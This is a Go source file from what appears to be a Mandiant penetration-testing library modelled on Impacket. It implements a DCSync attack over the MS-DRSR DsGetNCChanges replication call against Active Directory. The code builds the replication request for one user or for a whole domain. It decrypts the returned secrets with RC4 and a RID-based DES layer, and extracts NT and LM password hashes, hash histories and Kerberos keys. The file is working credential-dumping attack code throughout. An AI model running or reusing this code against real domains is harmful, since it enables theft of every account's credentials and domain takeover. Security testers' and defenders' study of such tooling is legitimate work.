// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package drsuapi

import (
	"bytes"
	"crypto/des"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"strings"

	"github.com/mandiant/gopacket/internal/build"
	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/utf16le"
)

// DSNAME represents an AD object name
type DSNAME struct {
	StructLen  uint32
	SidLen     uint32
	Guid       [16]byte
	Sid        []byte
	NameLen    uint32
	StringName string
}

// ReplicatedObject contains the replicated attributes of an AD object
type ReplicatedObject struct {
	GUID               [16]byte
	DN                 string
	SAMAccountName     string
	ObjectSid          []byte
	RID                uint32
	NTHash             []byte        // Decrypted NT hash (16 bytes)
	LMHash             []byte        // Decrypted LM hash (16 bytes)
	NTHashHistory      [][]byte      // Historical NT hashes (each 16 bytes)
	LMHashHistory      [][]byte      // Historical LM hashes (each 16 bytes)
	SupplementalCreds  []byte        // Decrypted supplementalCredentials
	KerberosKeys       []KerberosKey // Parsed Kerberos keys from supplementalCredentials
	UserAccountControl uint32
	PwdLastSet         int64 // Windows FILETIME (100-nanosecond intervals since 1601-01-01)
}

// PrefixEntry represents an entry in the schema prefix table
type PrefixEntry struct {
	Index  uint32
	Prefix []byte
}

// GetNCChangesResult contains the response from DsGetNCChanges
type GetNCChangesResult struct {
	Objects       []ReplicatedObject
	MoreData      bool
	HighWaterMark USNVector // USN state for continuation
}

// USNVector tracks replication state for pagination
type USNVector struct {
	HighObjUpdate  uint64
	Reserved       uint64
	HighPropUpdate uint64
}

// DsGetNCChanges requests replication of a single object from a naming context.
// For DCSync, we use EXOP_REPL_OBJ to get password hashes.
// dsaGuid should be the NtdsDsaObjectGuid from DsDomainControllerInfo.
// sessionKey is the NTLM session key used to decrypt encrypted attributes.
func DsGetNCChanges(client *dcerpc.Client, hBind []byte, domainDN string, userDN string, dsaGuid [16]byte, sessionKey []byte) (*GetNCChangesResult, error) {
	return dsGetNCChangesInternal(client, hBind, domainDN, userDN, dsaGuid, sessionKey, true, USNVector{})
}

// DsGetNCChangesAll requests replication of all objects from a naming context.
// This is used for full domain credential dumping.
// usnFrom is the USN watermark for pagination (use empty USNVector for initial request).
func DsGetNCChangesAll(client *dcerpc.Client, hBind []byte, domainDN string, dsaGuid [16]byte, sessionKey []byte, usnFrom USNVector) (*GetNCChangesResult, error) {
	return dsGetNCChangesInternal(client, hBind, domainDN, domainDN, dsaGuid, sessionKey, false, usnFrom)
}

func dsGetNCChangesInternal(client *dcerpc.Client, hBind []byte, domainDN string, targetDN string, dsaGuid [16]byte, sessionKey []byte, singleObject bool, usnFrom USNVector) (*GetNCChangesResult, error) {
	buf := new(bytes.Buffer)

	// [in] DRS_HANDLE hDrs (context handle - 20 bytes)
	buf.Write(hBind)

	// [in] DWORD dwInVersion - use version 8 for EXOP support
	binary.Write(buf, binary.LittleEndian, uint32(8))

	// [in] [switch_is(dwInVersion)] DRS_MSG_GETCHGREQ* pmsgIn
	// Per Impacket, the union is embedded (not a separate pointer) at the top level
	// DRS_MSG_GETCHGREQ is an NDR UNION with embedded tag (discriminant)
	binary.Write(buf, binary.LittleEndian, uint32(8)) // Union tag = 8 for V8

	// For version 8: DRS_MSG_GETCHGREQ_V8
	writeGetNCChangesRequestV8(buf, domainDN, targetDN, dsaGuid, singleObject, usnFrom)

	if build.Debug {
		log.Printf("[D] DsGetNCChanges request payload (%d bytes): %x", buf.Len(), buf.Bytes())
	}

	// Call DsGetNCChanges
	var resp []byte
	var err error
	if client.Authenticated {
		resp, err = client.CallAuthAuto(OpDsGetNCChanges, buf.Bytes())
	} else {
		resp, err = client.Call(OpDsGetNCChanges, buf.Bytes())
	}
	if err != nil {
		return nil, err
	}

	return parseGetNCChangesResponse(resp, sessionKey)
}

func writeGetNCChangesRequestV8(buf *bytes.Buffer, domainDN string, targetDN string, dsaGuid [16]byte, singleObject bool, usnFrom USNVector) {
	// DRS_MSG_GETCHGREQ_V8 structure:
	// uuidDsaObjDest (16 bytes) - destination DSA GUID
	// uuidInvocIdSrc (16 bytes) - source invocation ID (same as DSA GUID)
	// pNC (DSNAME*) - naming context pointer
	// usnvecFrom (USN_VECTOR) - high watermark
	// pUpToDateVecDest (UPTODATE_VECTOR_V1_EXT*) - null
	// ulFlags (DWORD) - replication flags
	// cMaxObjects (DWORD) - max objects to return
	// cMaxBytes (DWORD) - max bytes to return
	// ulExtendedOp (DWORD) - extended operation (EXOP_REPL_SECRETS)
	// liFsmoInfo (ULARGE_INTEGER) - FSMO info
	// pPartialAttrSet (PARTIAL_ATTR_VECTOR_V1_EXT*) - attributes to replicate
	// pPartialAttrSetEx (PARTIAL_ATTR_VECTOR_V1_EXT*) - null
	// PrefixTableDest (SCHEMA_PREFIX_TABLE) - prefix table

	// NDR alignment: pad to 8-byte boundary before structure with 8-byte members
	// After hBind(20) + dwInVersion(4) + unionTag(4) = 28 bytes, need 4 more for 32
	buf.Write(make([]byte, 4)) // Alignment padding

	// uuidDsaObjDest (16 bytes) - use the DSA GUID from DsDomainControllerInfo
	buf.Write(dsaGuid[:])

	// uuidInvocIdSrc (16 bytes) - use the same DSA GUID
	buf.Write(dsaGuid[:])

	// pNC - pointer to DSNAME
	binary.Write(buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID

	// NDR alignment: pad to 8-byte boundary before USN_VECTOR (contains 8-byte integers)
	// Current position: 32 + 16 + 16 + 4 = 68, need 4 more for 72
	buf.Write(make([]byte, 4)) // Alignment padding

	// usnvecFrom (USN_VECTOR - 24 bytes)
	binary.Write(buf, binary.LittleEndian, usnFrom.HighObjUpdate)
	binary.Write(buf, binary.LittleEndian, usnFrom.Reserved)
	binary.Write(buf, binary.LittleEndian, usnFrom.HighPropUpdate)

	// pUpToDateVecDest - null pointer
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// ulFlags
	var flags uint32
	if singleObject {
		flags = DRS_INIT_SYNC | DRS_WRIT_REP
	} else {
		// For full NC replication
		flags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_GET_ANC
	}
	binary.Write(buf, binary.LittleEndian, flags)

	// cMaxObjects
	if singleObject {
		binary.Write(buf, binary.LittleEndian, uint32(1))
	} else {
		binary.Write(buf, binary.LittleEndian, uint32(1000))
	}

	// cMaxBytes
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// ulExtendedOp
	if singleObject {
		binary.Write(buf, binary.LittleEndian, uint32(EXOP_REPL_OBJ))
	} else {
		binary.Write(buf, binary.LittleEndian, uint32(EXOP_NONE))
	}

	// NDR alignment: liFsmoInfo is ULARGE_INTEGER (8 bytes) - needs 8-byte alignment
	// Current position is 116 (not 8-byte aligned), pad to 120
	buf.Write(make([]byte, 4)) // Alignment padding for ULARGE_INTEGER

	// liFsmoInfo (8 bytes)
	buf.Write(make([]byte, 8))

	// pPartialAttrSet - NULL for now
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// pPartialAttrSetEx - null
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// PrefixTableDest - SCHEMA_PREFIX_TABLE (inline, not pointer)
	// PrefixCount (DWORD)
	binary.Write(buf, binary.LittleEndian, uint32(0))
	// pPrefixEntry (pointer to array) - null
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// --- Deferred data ---

	// DSNAME for pNC
	writeDSNAME(buf, targetDN)
}

func writeDSNAME(buf *bytes.Buffer, nameOrGUID string) {
	// DSNAME is a conformant structure in NDR because StringName is [size_is(NameLen+1)]
	// Per NDR rules:
	// 1. Conformance (MaxCount for StringName) comes first
	// 2. Then the structure fields

	// Check if nameOrGUID is a GUID (starts with '{' and ends with '}')
	var guid []byte
	var encodedDN []byte
	var nameLen uint32

	if len(nameOrGUID) >= 38 && nameOrGUID[0] == '{' && nameOrGUID[37] == '}' {
		// This is a GUID - parse it
		guid = parseGUID(nameOrGUID)
		nameLen = 0
	} else {
		// This is a DN
		encodedDN = utf16le.EncodeStringToBytes(nameOrGUID)
		nameLen = uint32(len(nameOrGUID))
	}

	charCount := nameLen + 1 // Include null terminator

	// Calculate structLen: the size of the entire DSNAME structure
	// structLen(4) + SidLen(4) + Guid(16) + Sid(28) + NameLen(4) + StringName((nameLen+1)*2)
	// MS-DRSR 4.1.4.1.1 specifies structLen as the exact byte size, rounded
	// to a 4-byte boundary. Impacket carries a "+2" on top of the round-up
	// that no part of the spec or wire trace justifies; AD is forgiving but
	// a stricter implementation would reject. Keep just the alignment round.
	stringNameBytes := charCount * 2
	structLen := uint32(4 + 4 + 16 + 28 + 4 + stringNameBytes)
	if structLen%4 != 0 {
		structLen += 4 - (structLen % 4)
	}

	// Track start for final alignment
	startOffset := buf.Len()

	// NDR conformance first (MaxCount for StringName array)
	binary.Write(buf, binary.LittleEndian, charCount)

	// DSNAME structure fields
	binary.Write(buf, binary.LittleEndian, structLen) // structLen
	binary.Write(buf, binary.LittleEndian, uint32(0)) // SidLen = 0

	// Write GUID (16 bytes)
	if guid != nil {
		buf.Write(guid)
	} else {
		buf.Write(make([]byte, 16))
	}

	buf.Write(make([]byte, 28))                     // Sid = empty (28 bytes when SidLen=0)
	binary.Write(buf, binary.LittleEndian, nameLen) // NameLen

	// Write StringName (even if empty, we need the null terminator)
	if nameLen > 0 {
		buf.Write(encodedDN)
	}
	buf.Write([]byte{0, 0}) // Null terminator

	// Pad to 4-byte boundary
	written := buf.Len() - startOffset
	if written%4 != 0 {
		buf.Write(make([]byte, 4-written%4))
	}
}

// parseGUID converts a GUID string like "{cf299fd6-6e63-4617-b071-6461a9895bd4}" to 16 bytes
func parseGUID(s string) []byte {
	// Remove braces and dashes: cf299fd6-6e63-4617-b071-6461a9895bd4
	s = strings.Trim(s, "{}")
	s = strings.ReplaceAll(s, "-", "")

	// Parse hex string
	data, err := hex.DecodeString(s)
	if err != nil || len(data) != 16 {
		return nil
	}

	// GUID byte order: first 3 components are little-endian, last 2 are big-endian
	// Data1 (4 bytes): reverse bytes
	// Data2 (2 bytes): reverse bytes
	// Data3 (2 bytes): reverse bytes
	// Data4 (8 bytes): as-is
	result := make([]byte, 16)
	// Data1: bytes 0-3 reversed
	result[0] = data[3]
	result[1] = data[2]
	result[2] = data[1]
	result[3] = data[0]
	// Data2: bytes 4-5 reversed
	result[4] = data[5]
	result[5] = data[4]
	// Data3: bytes 6-7 reversed
	result[6] = data[7]
	result[7] = data[6]
	// Data4: bytes 8-15 as-is
	copy(result[8:], data[8:])

	return result
}

func parseGetNCChangesResponse(resp []byte, sessionKey []byte) (*GetNCChangesResult, error) {
	if len(resp) < 8 {
		return nil, fmt.Errorf("response too short")
	}

	if build.Debug {
		log.Printf("[D] DsGetNCChanges raw response size: %d bytes", len(resp))
		log.Printf("[D] DsGetNCChanges first 128 bytes: %x", resp[:min(128, len(resp))])
		// Show bytes around position 10000
		if len(resp) > 10400 {
			log.Printf("[D] DsGetNCChanges bytes at 10296-10360: %x", resp[10296:10360])
		}
	}

	r := bytes.NewReader(resp)

	// [out] DWORD* pdwOutVersion
	var outVersion uint32
	binary.Read(r, binary.LittleEndian, &outVersion)

	if build.Debug {
		log.Printf("[D] DsGetNCChanges response version: %d", outVersion)
	}

	// [out] [switch_is(*pdwOutVersion)] DRS_MSG_GETCHGREPLY* pmsgOut
	switch outVersion {
	case 1:
		// V1 is a simple/error response
		return parseGetNCChangesResponseV1(r)
	case 6, 7, 9:
		// V6 is the canonical shape; V7 and V9 add fields after V6 that we
		// currently don't consume. Implementation lives in getncchanges_v6.go.
		// On parse error we still return whatever objects were extracted
		// before the decoder hit the fault.
		res, err := parseGetNCChangesResponseV6NDR(resp, sessionKey)
		if err != nil && build.Debug {
			log.Printf("[D] V6 NDR parse stopped early: %v (returning %d objects)", err, len(res.Objects))
		}
		return res, nil
	default:
		return nil, fmt.Errorf("unsupported response version: %d", outVersion)
	}
}

func parseGetNCChangesResponseV1(r *bytes.Reader) (*GetNCChangesResult, error) {
	result := &GetNCChangesResult{}

	// DRS_MSG_GETCHGREPLY_V1:
	// uuidDsaObjSrc (16 bytes)
	// uuidInvocIdSrc (16 bytes)
	// pNC (DSNAME*) - pointer
	// usnvecFrom (USN_VECTOR - 24 bytes)
	// usnvecTo (USN_VECTOR - 24 bytes)
	// pUpToDateVecSrcV1 (UPTODATE_VECTOR_V1_EXT*) - pointer
	// PrefixTableSrc (SCHEMA_PREFIX_TABLE)
	// ulExtendedRet (EXOP_ERR)
	// cNumObjects (DWORD)
	// cNumBytes (DWORD)
	// pObjects (REPLENTINFLIST*) - pointer
	// fMoreData (BOOL)

	// Union tag (already read version in parent)
	var unionTag uint32
	binary.Read(r, binary.LittleEndian, &unionTag)

	// Skip uuidDsaObjSrc and uuidInvocIdSrc
	r.Seek(32, 1)

	// pNC pointer
	var ptrNC uint32
	binary.Read(r, binary.LittleEndian, &ptrNC)

	// Skip USN vectors (48 bytes)
	r.Seek(48, 1)

	// pUpToDateVecSrcV1 pointer
	var ptrUpToDate uint32
	binary.Read(r, binary.LittleEndian, &ptrUpToDate)

	// PrefixTableSrc
	var prefixCount uint32
	binary.Read(r, binary.LittleEndian, &prefixCount)
	var ptrPrefixEntry uint32
	binary.Read(r, binary.LittleEndian, &ptrPrefixEntry)

	// ulExtendedRet (EXOP_ERR)
	var extendedRet uint32
	binary.Read(r, binary.LittleEndian, &extendedRet)

	// cNumObjects
	var numObjects uint32
	binary.Read(r, binary.LittleEndian, &numObjects)

	// cNumBytes
	var numBytes uint32
	binary.Read(r, binary.LittleEndian, &numBytes)

	// pObjects pointer
	var ptrObjects uint32
	binary.Read(r, binary.LittleEndian, &ptrObjects)

	// fMoreData
	var moreData uint32
	binary.Read(r, binary.LittleEndian, &moreData)
	result.MoreData = moreData != 0

	// Read remaining bytes (should include function return status)
	remaining := make([]byte, r.Len())
	r.Read(remaining)

	// The function return status is the last 4 bytes of the response
	var returnStatus uint32
	if len(remaining) >= 4 {
		returnStatus = binary.LittleEndian.Uint32(remaining[len(remaining)-4:])
	}

	if build.Debug {
		log.Printf("[D] DsGetNCChanges V1: extRet=%d (0x%x), numObjects=%d, numBytes=%d, moreData=%v",
			extendedRet, extendedRet, numObjects, numBytes, result.MoreData)
		log.Printf("[D] DsGetNCChanges V1: remaining bytes (%d): %x, returnStatus=0x%x (%d)",
			len(remaining), remaining, returnStatus, returnStatus)
	}

	// Check return status first (Windows error code)
	if returnStatus != 0 {
		return nil, fmt.Errorf("DsGetNCChanges failed with status 0x%x (%d)", returnStatus, returnStatus)
	}

	// Check for errors in ulExtendedRet
	// EXOP_ERR values: 1=SUCCESS, 2=UNKNOWN_OP, ..., 15=ACCESS_DENIED, 16=PARAM_ERROR
	if extendedRet != 0 && extendedRet != 1 {
		errName := getExopErrName(extendedRet)
		return nil, fmt.Errorf("EXOP error %d (%s)", extendedRet, errName)
	}

	return result, nil
}

func getExopErrName(code uint32) string {
	switch code {
	case 1:
		return "SUCCESS"
	case 2:
		return "UNKNOWN_OP"
	case 3:
		return "FSMO_NOT_OWNER"
	case 4:
		return "UPDATE_ERR"
	case 5:
		return "EXCEPTION"
	case 6:
		return "UNKNOWN_CALLER"
	case 7:
		return "RID_ALLOC"
	case 8:
		return "FSMO_OWNER_DELETED"
	case 9:
		return "FSMO_PENDING_OP"
	case 10:
		return "MISMATCH"
	case 11:
		return "COULDNT_CONTACT"
	case 12:
		return "FSMO_REFUSING_ROLES"
	case 13:
		return "DIR_ERROR"
	case 14:
		return "FSMO_MISSING_SETTINGS"
	case 15:
		return "ACCESS_DENIED"
	case 16:
		return "PARAM_ERROR"
	default:
		return "UNKNOWN"
	}
}


func processAttribute(attrTyp uint32, valData []byte, obj *ReplicatedObject, sessionKey []byte) {
	switch attrTyp {
	case DRSUAPI_ATTID_sAMAccountName:
		// UTF-16LE string
		obj.SAMAccountName = utf16le.DecodeToString(valData)

	case DRSUAPI_ATTID_objectSid:
		obj.ObjectSid = valData
		// Extract RID from SID. Layout: rev(1) + subAuthCount(1) + idAuth(6)
		// + subAuth[N](4 each). RID is the last SubAuthority, so we need at
		// least one SubAuthority present — minimum 12 bytes. At len 8 the
		// "last 4 bytes" would be IdentifierAuthority tail, not a RID.
		if len(valData) >= 12 {
			obj.RID = binary.LittleEndian.Uint32(valData[len(valData)-4:])
		}

	case DRSUAPI_ATTID_userAccountControl:
		if len(valData) >= 4 {
			obj.UserAccountControl = binary.LittleEndian.Uint32(valData)
		}

	case DRSUAPI_ATTID_unicodePwd:
		// Encrypted NTLM hash
		decrypted := decryptAttribute(valData, sessionKey)
		if len(decrypted) >= 16 && obj.RID != 0 {
			obj.NTHash = removeDESLayer(decrypted, obj.RID)
		}

	case DRSUAPI_ATTID_dBCSPwd:
		// Encrypted LM hash
		decrypted := decryptAttribute(valData, sessionKey)
		if len(decrypted) >= 16 && obj.RID != 0 {
			obj.LMHash = removeDESLayer(decrypted, obj.RID)
		}

	case DRSUAPI_ATTID_supplementalCredentials:
		// Encrypted supplemental credentials (Kerberos keys, etc.)
		obj.SupplementalCreds = decryptAttribute(valData, sessionKey)
		// Parse Kerberos keys from supplementalCredentials
		if keys, err := ParseSupplementalCredentials(obj.SupplementalCreds); err == nil {
			obj.KerberosKeys = keys
		}

	case DRSUAPI_ATTID_pwdLastSet:
		// Windows FILETIME: 64-bit little-endian (100ns intervals since 1601-01-01)
		if len(valData) >= 8 {
			obj.PwdLastSet = int64(binary.LittleEndian.Uint64(valData))
		}

	case DRSUAPI_ATTID_ntPwdHistory:
		// Encrypted NT hash history — contains multiple 16-byte hashes concatenated
		decrypted := decryptAttribute(valData, sessionKey)
		if len(decrypted) >= 16 && obj.RID != 0 {
			// Each entry is 16 bytes; decrypt each with RID-based DES
			for off := 0; off+16 <= len(decrypted); off += 16 {
				h := removeDESLayer(decrypted[off:off+16], obj.RID)
				if len(h) == 16 {
					obj.NTHashHistory = append(obj.NTHashHistory, h)
				}
			}
		}

	case DRSUAPI_ATTID_lmPwdHistory:
		// Encrypted LM hash history — contains multiple 16-byte hashes concatenated
		decrypted := decryptAttribute(valData, sessionKey)
		if len(decrypted) >= 16 && obj.RID != 0 {
			for off := 0; off+16 <= len(decrypted); off += 16 {
				h := removeDESLayer(decrypted[off:off+16], obj.RID)
				if len(h) == 16 {
					obj.LMHashHistory = append(obj.LMHashHistory, h)
				}
			}
		}
	}
}

// decryptAttribute decrypts an ENCRYPTED_PAYLOAD structure
// Structure: Salt (16 bytes) + encrypted data
// Decryption: RC4(MD5(sessionKey + Salt), encryptedData)
// Returns: decrypted data (first 4 bytes are checksum, rest is actual data)
func decryptAttribute(data []byte, sessionKey []byte) []byte {
	if len(data) < 20 { // 16 salt + at least 4 bytes
		return nil
	}

	salt := data[:16]
	encrypted := data[16:]

	// Derive RC4 key: MD5(sessionKey + salt)
	h := md5.New()
	h.Write(sessionKey)
	h.Write(salt)
	rc4Key := h.Sum(nil)

	// Decrypt with RC4
	cipher, err := rc4.NewCipher(rc4Key)
	if err != nil {
		return nil
	}

	decrypted := make([]byte, len(encrypted))
	cipher.XORKeyStream(decrypted, encrypted)

	// First 4 bytes are CRC32 checksum, skip them
	if len(decrypted) < 4 {
		return nil
	}

	return decrypted[4:]
}

// removeDESLayer removes the RID-based DES encryption layer from password hashes
func removeDESLayer(encryptedHash []byte, rid uint32) []byte {
	if len(encryptedHash) < 16 {
		return nil
	}

	key1, key2 := deriveDesKeys(rid)

	// DES decrypt each 8-byte block
	block1 := desDecrypt(encryptedHash[:8], key1)
	block2 := desDecrypt(encryptedHash[8:16], key2)

	result := make([]byte, 16)
	copy(result[:8], block1)
	copy(result[8:], block2)

	return result
}

// deriveDesKeys derives two 8-byte DES keys from a RID
func deriveDesKeys(rid uint32) ([]byte, []byte) {
	ridBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(ridBytes, rid)

	// Key1: I[0], I[1], I[2], I[3], I[0], I[1], I[2]
	key1Src := []byte{ridBytes[0], ridBytes[1], ridBytes[2], ridBytes[3], ridBytes[0], ridBytes[1], ridBytes[2]}
	// Key2: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
	key2Src := []byte{ridBytes[3], ridBytes[0], ridBytes[1], ridBytes[2], ridBytes[3], ridBytes[0], ridBytes[1]}

	return transformToDesKey(key1Src), transformToDesKey(key2Src)
}

// transformToDesKey converts 7 bytes to an 8-byte DES key with parity bits
func transformToDesKey(key7 []byte) []byte {
	key8 := make([]byte, 8)

	key8[0] = key7[0] >> 1
	key8[1] = ((key7[0] & 0x01) << 6) | (key7[1] >> 2)
	key8[2] = ((key7[1] & 0x03) << 5) | (key7[2] >> 3)
	key8[3] = ((key7[2] & 0x07) << 4) | (key7[3] >> 4)
	key8[4] = ((key7[3] & 0x0F) << 3) | (key7[4] >> 5)
	key8[5] = ((key7[4] & 0x1F) << 2) | (key7[5] >> 6)
	key8[6] = ((key7[5] & 0x3F) << 1) | (key7[6] >> 7)
	key8[7] = key7[6] & 0x7F

	// Set parity bits
	for i := 0; i < 8; i++ {
		key8[i] = (key8[i] << 1) & 0xFE
	}

	return key8
}

// desDecrypt performs single DES ECB decryption
func desDecrypt(data []byte, key []byte) []byte {
	if len(data) != 8 || len(key) != 8 {
		return data
	}

	block, err := des.NewCipher(key)
	if err != nil {
		return data
	}

	decrypted := make([]byte, 8)
	block.Decrypt(decrypted, data)
	return decrypted
}

// GetUserSecrets performs DCSync for a single user
func GetUserSecrets(client *dcerpc.Client, hBind []byte, userDN string, domainDN string, dsaGuid [16]byte, sessionKey []byte) (*ReplicatedObject, error) {
	result, err := DsGetNCChanges(client, hBind, domainDN, userDN, dsaGuid, sessionKey)
	if err != nil {
		return nil, err
	}

	if len(result.Objects) == 0 {
		return nil, fmt.Errorf("no objects returned")
	}

	return &result.Objects[0], nil
}
